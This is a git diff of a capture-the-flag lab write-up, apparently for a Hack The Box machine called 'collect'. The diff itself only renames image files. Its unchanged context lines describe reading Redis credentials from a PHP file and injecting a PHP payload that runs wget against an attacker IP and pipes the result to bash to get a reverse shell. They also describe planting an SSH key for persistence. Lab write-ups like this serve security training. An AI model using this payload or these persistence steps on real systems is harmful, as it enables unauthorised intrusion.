@@ -167,7 +167,7 @@ This time, we need to find credentials elsewhere. That `redis` instance is likel
 
 I tried checking for `config.php` files but was unable to find any. I knew that we had to go 'up' one directory because the current directory contained nothing, Some googling about Redis led me to the `bootstrp.php` file, which worked. It was located at `../bootstrp.php`.
 
-<figure><img src="../../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (12) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Redis
 
@@ -177,7 +177,7 @@ We can login via `redis-cli` wth credentials.
 
 Then, we can list the keys and other information within this database.
 
-<figure><img src="../../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (13) (1).png" alt=""><figcaption></figcaption></figure>
 
 Seems that all of these keys are empty arrays, for some reason. I registered another user within the `collect.htb` website to see if we can do any other things.
 
@@ -219,7 +219,7 @@ We can then replace the command with ``<?=`wget -O - 10.10.14.152/b|bash` ?>``
 
 Now, we have a reverse shell as `www-data`.
 
-<figure><img src="../../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## Privilege Escalation to Victor
 
@@ -287,7 +287,7 @@ done
 
 We can replace the command to get another reverse shell as needed.
 
-<figure><img src="../../../.gitbook/assets/image (10) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (10) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 From here, we can drop our public key into victor's .ssh folder to SSH in easily, and also grab the user flag.
 
